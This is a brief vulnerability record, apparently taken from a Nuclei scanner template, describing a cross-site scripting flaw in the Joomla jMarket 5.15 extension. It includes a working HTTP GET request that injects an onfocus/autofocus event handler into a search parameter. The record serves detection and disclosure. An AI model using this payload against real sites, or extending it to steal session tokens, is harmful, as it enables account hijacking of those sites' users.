# Vulnerability: Joomla jMarket 5.15 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`joomla-jmarket-xss.yaml`)

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_jvouchers&controller=catalog-results&task=query&wajx=1&wmjx=1&tmpl=component&type=raw&crtyid=12&trucs[x][search]=gx3vt%20onfocus=alert(document.domain)%20autofocus=%20itkrzsug7w5
```

